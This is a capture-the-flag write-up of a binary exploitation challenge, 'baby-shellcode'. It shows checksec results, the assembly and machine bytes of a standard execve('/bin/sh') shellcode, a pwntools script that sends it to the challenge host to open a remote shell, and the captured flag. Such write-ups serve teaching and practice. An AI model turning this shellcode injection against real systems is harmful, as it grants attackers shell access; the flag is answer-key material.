# baby-shellcode #

## Overview ##

Category: Binary Exploitation


Tags:  `#shellcode` `#pwntools` `#assembler` `#machine code` `#stack` `#x86-64` `#x86` `#amd64` `#little endian` `#Ghidra` `#checksec` 

## Description ##

This challenge is a test to see if you know how to write programs that machines can understand.

Oh, you know how to code?

Write some code into this program, and the program will run it for you.

What programming language, you ask? Well... I said it's the language that machines can understand.

nc 34.28.147.7 5000
## Approach ##


Began by disassembling the `baby-shellcode` binary within [Ghidra](https://ghidra-sre.org) and analysing the output.

Also checked the binary security with [pwntools](https://python3-pwntools.readthedocs.io/en/latest/index.html) `checksec` :

    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments


During the analysis of the disassembled binary, it became evident that, unlike previous instances, there is no shell function provided. This aligns with the challenge's requirements, indicating that we need to craft our own shellcode. To accomplish this, I utilized the pwntools library, which offers a collection of shellcode templates (pwn.shellcraft) and an assembler function (pwn.asm) to convert the shellcode into machine code.

The command pwn.shellcraft.sh() generates a shellcode that initiates a shell:

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall

Following this, the pwn.asm(shellcode) function assembles the shellcode into machine code:

    b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'

This shellcode is then inserted into the stack and executed. Given that the stack is executable, there are no concerns regarding execution constraints.




## Solution ##



Final `pwntools` script used in the event :

    import pwn
    from pwn import*

    elf=pwn.ELF("./baby-shellcode")
    p=elf.process()
    r=remote("34.28.147.7",5000)

    pwn.context.binary=elf

    shellcode=pwn.shellcraft.sh()
    shellcode=pwn.asm(shellcode)

    r.sendline(shellcode)
    r.interactive()

After running the script, we can see that we have a shell. We can then use the `ls` command to list the files in the current directory, and `cat flag` to read the flag.


## Flag ##
`uoftctf{arbitrary_machine_code_execution}`